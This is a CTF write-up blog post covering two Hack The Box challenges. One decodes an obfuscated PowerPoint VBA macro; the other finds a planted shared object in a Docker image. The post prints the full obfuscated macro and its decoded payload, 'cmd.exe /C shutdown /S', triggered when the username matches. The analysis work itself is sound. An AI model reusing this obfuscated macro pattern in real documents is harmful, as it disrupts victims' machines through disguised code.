---
layout: post
title: "HTB University CTF Writeups: Upgrades & Peel Back The Layers"
image: ''
date:   2021-11-23 12:00:00
tags:
- hackthebox
- htb-uni-ctf
- reverse-engineering
- dfir
- docker
- office-macros
- beginner
description: ''
categories:
published: false
comments: false
---

![intro](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211121130152.png)

## Intro
Surprisingly, this year's HackTheBox University CTF had a few challenges that I knocked out in under 20 minutes. "Upgrades" was the easy-rated reversing challenge, and "Peel Back The Layers" was the easy-rated forensics challenge, and both simply required you look in the right spot. I'll walk through both in this post since neither was that long.

For "Upgrades", we're given a .pptm file, which is just a macro-enabled powerpoint file. We use olevba from the oletools toolkit to extract the code for the macros, and, to be thorough, recreate the script in Python to see what strings are in the file.

For "Peel Back The Layers", we're given the name of a Docker repository, and asked to find some new file that was inserted into it. We'll pull down the image and load it into dive, a super useful tool for docker reverse engineering. Looking though the layers, we find a shared object file added to the image, which we can extract and find the hardcoded flag.

* buh
{:toc}

## Reversing: Upgrades
### Description
`We received this strange advertisement via pneumatic tube, and it claims to be able to do amazing things! But we there's suspect something strange in it, can you uncover the truth?`

### Solving
We only get one file from the zip file, and that is `Upgrades.pptm`.
```bash
kali@transistor:~/ctf/htb_uni/rev_upgrades$ file Upgrades.pptm 
Upgrades.pptm: Microsoft PowerPoint 2007+
```

Typically, when a file from the Microsoft Office suite (e.g. Word, Excel, PowerPoint) has an "m" at the end of it, this is an indication that there are macros on the file. While the idea of macros on documents was created with good intent, they're most commonly used these days to get code execution on a target after phishing them. A typical document, when opened, might have some kind of image on top saying "You must click 'Enable Editing' and 'Enable Macros' to view this document", which is just a cybercriminal trying to lure the unsuspecting into triggering the code.

We can check if any macros on a document look suspicious using the [oletools](https://github.com/decalage2/oletools) toolkit, specifically, `olevba`. We get the following output.

```bash
kali@transistor:~/ctf/htb_uni/rev_upgrades$ olevba Upgrades.pptm 
olevba 0.60 on Python 3.9.7 - http://decalage.info/python/oletools
===============================================================================
FILE: Upgrades.pptm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ppt/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Function q(g) As String
q = ""
For Each I In g
q = q & Chr((I * 59 - 54) And 255)
Next I
End Function
Sub OnSlideShowPageChange()
j = Array(q(Array(245, 46, 46, 162, 245, 162, 254, 250, 33, 185, 33)), _
q(Array(215, 120, 237, 94, 33, 162, 241, 107, 33, 20, 81, 198, 162, 219, 159, 172, 94, 33, 172, 94)), _
q(Array(245, 46, 46, 162, 89, 159, 120, 33, 162, 254, 63, 206, 63)), _
q(Array(89, 159, 120, 33, 162, 11, 198, 237, 46, 33, 107)), _
q(Array(232, 33, 94, 94, 33, 120, 162, 254, 237, 94, 198, 33)))
g = Int((UBound(j) + 1) * Rnd)
With ActivePresentation.Slides(2).Shapes(2).TextFrame
.TextRange.Text = j(g)
End With
If StrComp(Environ$(q(Array(81, 107, 33, 120, 172, 85, 185, 33))), q(Array(154, 254, 232, 3, 171, 171, 16, 29, 111, 228, 232, 245, 111, 89, 158, 219, 24, 210, 111, 171, 172, 219, 210, 46, 197, 76, 167, 233)), vbBinaryCompare) = 0 Then
VBA.CreateObject(q(Array(215, 11, 59, 120, 237, 146, 94, 236, 11, 250, 33, 198, 198))).Run (q(Array(59, 185, 46, 236, 33, 42, 33, 162, 223, 219, 162, 107, 250, 81, 94, 46, 159, 55, 172, 162, 223, 11)))
End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO Slide1.cls 
in file: ppt/vbaProject.bin - OLE stream: 'VBA/Slide1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Label1_Click()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

This doesn't really look that "bad", but it is a CTF, so of course it wouldn't be live malware. I can take the code that `olevba` identified and format it to be more readable.

```vbscript
Private Function q(g) As String
	q = ""
	For Each I In g
		q = q & Chr((I * 59 - 54) And 255)
		Next I
End Function

Sub OnSlideShowPageChange()
	j = Array(q(Array(245, 46, 46, 162, 245, 162, 254, 250, 33, 185, 33)), _
	q(Array(215, 120, 237, 94, 33, 162, 241, 107, 33, 20, 81, 198, 162, 219, 159, 172, 94, 33, 172, 94)), _
	q(Array(245, 46, 46, 162, 89, 159, 120, 33, 162, 254, 63, 206, 63)), _
	q(Array(89, 159, 120, 33, 162, 11, 198, 237, 46, 33, 107)), _
	q(Array(232, 33, 94, 94, 33, 120, 162, 254, 237, 94, 198, 33)))
	g = Int((UBound(j) + 1) * Rnd)
	With ActivePresentation.Slides(2).Shapes(2).TextFrame
		.TextRange.Text = j(g)
	End With
	If StrComp(Environ$(q(Array(81, 107, 33, 120, 172, 85, 185, 33))), q(Array(154, 254, 232, 3, 171, 171, 16, 29, 111, 228, 232, 245, 111, 89, 158, 219, 24, 210, 111, 171, 172, 219, 210, 46, 197, 76, 167, 233)), vbBinaryCompare) = 0 Then
		VBA.CreateObject(q(Array(215, 11, 59, 120, 237, 146, 94, 236, 11, 250, 33, 198, 198))).Run (q(Array(59, 185, 46, 236, 33, 42, 33, 162, 223, 219, 162, 107, 250, 81, 94, 46, 159, 55, 172, 162, 223, 11)))
	End If
End Sub
```

This program seems to be decoding arrays, and possibly running functions using them, but it doesn't seem malicious at all. We could go ahead and modify this so that it just prints out the strings that are supposed to come out of those arrays, but I'm also a big fan of rewriting it in Python (or at least recreate some components) to understand what's going on. After a little bit of going back and forth, I came up with this.

```python
#!/usr/bin/python3

def q(g):
	q = ""
	for I in g:
		q += chr((I * 59 - 54) & 255)
	print(q)
	return q
	
if __name__ == "__main__":
	array1 = q([245, 46, 46, 162, 245, 162, 254, 250, 33, 185, 33])
	array2 = q([215, 120, 237, 94, 33, 162, 241, 107, 33, 20, 81, 198, 162, 219, 159, 172, 94, 33, 172, 94])
	array3 = q([245, 46, 46, 162, 89, 159, 120, 33, 162, 254, 63, 206, 63])
	array4 = q([89, 159, 120, 33, 162, 11, 198, 237, 46, 33, 107])
	array5 = q([232, 33, 94, 94, 33, 120, 162, 254, 237, 94, 198, 33])
	j = [array1, array2, array3, array4, array5]
	
	# final bit
	array6 = q([81, 107, 33, 120, 172, 85, 185, 33])
	array7 = q([154, 254, 232, 3, 171, 171, 16, 29, 111, 228, 232, 245, 111, 89, 158, 219, 24, 210, 111, 171, 172, 219, 210, 46, 197, 76, 167, 233])
	
	array8 = q([215, 11, 59, 120, 237, 146, 94, 236, 11, 250, 33, 198, 198])
	array9 = q([59, 185, 46, 236, 33, 42, 33, 162, 223, 219, 162, 107, 250, 81, 94, 46, 159, 55, 172, 162, 223, 11])
```

Running the program gives this output, and we can submit the flag.
```shell
Add A Theme
Write Useful Content
Add More TODO
More Slides
Better Title
username
HTB{33zy_VBA_M4CR0_3nC0d1NG}
WScript.Shell
cmd.exe /C shutdown /S
```

Seems that the only bad thing is that it shuts down your computer. 

## Forensics: Peel Back The Layers
### Description
`An unknown maintainer managed to push an update to one of our public docker images. Our SOC team reported suspicious traffic coming from some of our steam factories ever since. The update got retracted making us unable to investigate further. We are concerned that this might refer to a supply-chain attack. Could you investigate?  
Docker Image: steammaintainer/gearrepairimage`

### Solving
After reading through a lot of the discussion in the discord, it seems like people pulled down the image and went searching for a needle in a haystack. While this works, I would like to take this time to highlight my favorite Docker reversing tool, [dive](https://github.com/wagoodman/dive).

Dive is a neat tool that lets you see all of the changes made to an image layer by layer. This can help expedite the process of reversing because you get a list of things that were done to the image, and are able to view those changes in the file system of the image. You still have to navigate to the overlay directory on your machine to get the file, but this has saved me a lot of time during CTFs in the past.

I'll switch over to my Remnux machine to show exactly how it's done. We're already given the name of the image, so we can just load that onto our machine.
```bash
remnux@remnux:~/ctf/htb_uni/forensics_peel_back_layers$ docker pull steammaintainer/gearrepairimage
Using default tag: latest
latest: Pulling from steammaintainer/gearrepairimage
7b1a6ab2e44d: Pull complete 
858929a69ddb: Pull complete 
97239c492e4d: Pull complete 
Digest: sha256:10d7e659f8d2bc2abcc4ef52d6d7caf026d0881efcffe016e120a65b26a87e7b
Status: Downloaded newer image for steammaintainer/gearrepairimage:latest
docker.io/steammaintainer/gearrepairimage:latest
```

For people that don't understand, the `steammaintainer/gearrepairimage` refers to the name of a docker repository, which is similar to a git repository in many ways. Simply put, docker repository are supposed to store and provide docker images, along with elements of version control with those images. The `docker pull` command is, in a sense, similar to the `git clone` command.

We can now check the status of our image with `docker images`.
```bash
remnux@remnux:~/ctf/htb_uni/forensics_peel_back_layers$ docker images
REPOSITORY                        TAG       IMAGE ID       CREATED      SIZE
steammaintainer/gearrepairimage   latest    47f41629f1cf   9 days ago   72.8MB
```

Now that the image is up, we can load it into dive by using the image ID, and start using the tool.
```bash
remnux@remnux:~/ctf/htb_uni/forensics_peel_back_layers$ sudo dive 47f41629f1cf
```

This is what `dive` looks like.
![asdf](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211122102817.png)

A brief explanation of what you're seeing:
- The top left window labeled **Layers** shows the layers and stages that make up the image. You can navigate through these using the arrow keys.
- The window to the right labeled **Current Layer Contents** shows you exactly what the file system looks like at that layer. `dive` also tries to color code what files have changed or were added.
- The window to the left called **Layer Details** tells you exactly what commands were executed in the Dockerfile, a file that sets up the image on launch, for that layer

If we look at the second layer, we notice the following entry in "Layer Details".
```d
#(nop) COPY file:0b1afae23b8f468ed1b0570b72d4855f0a24f2a63388c5c077938dbfdeda945c in /usr/share/lib/librs.so
```

This seems to be the only lead at this time. We can locate this file in the "Current Layer Contents".
![asdf](https://an00brektn.github.io/img/uni-ctf/Pasted image 20211122103617.png)

We can access the file by entering the image at that layer and going from there, but I find it easiest to go to `/var/lib/docker/overlay2`.
```bash
root@remnux:/var/lib/docker/overlay2# ls -la
total 24
drwx--x---  6 root root 4096 Nov 22 11:20 .
drwx--x--- 13 root root 4096 Nov 22 11:20 ..
drwx--x---  3 root root 4096 Nov 22 11:20 2d4dd1a91c123d2099cb70cba5b4312c92b724babdf35dcdb864beee914e0ca0
drwx--x---  4 root root 4096 Nov 22 11:26 45e6bf07a22d7ce25c287cf9828868893e36983898de96d800c412463964c869
drwx--x---  4 root root 4096 Nov 22 11:26 c9272024e3fffe4dc145973237870c8a8aecf8689392daf21b6719ad24ca7401
drwx------  2 root root 4096 Nov 22 11:20 l
```

We've already done the work of finding the file that looks out of place, so we just have to navigate the relevant layer folder and grab the file (alternatively, run a quick find command and work from there). I'll copy this shared object file to my working directory from earlier, and do my go-to move of running `strings` on the file. We find the flag almost immediately, just have to do some cleaning up.
```bash
remnux@remnux:~/ctf/htb_uni/forensics_peel_back_layers$ strings librs.so 
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
fork
getenv
atoi
inet_addr
htons
socket
connect
write
dup2
execve
libc.so.6
GLIBC_2.2.5
u/UH
HTB{1_r3H
4lly_l1kH
3_st34mpH
unk_r0b0H
ts!!!}
...[trim]...
```

**FLAG:** `HTB{1_r34lly_l1k3_st34mpunk_r0b0ts!!!}`

Some further analysis in ghidra shows us that the flag was hard coded in hex across 4 lines, so that's why it looks the way it does. Although we've already found the flag, we probably don't want a random image still running on our system, so we can run `docker image rm IMAGE_ID`, after exiting `dive`, to remove the image.

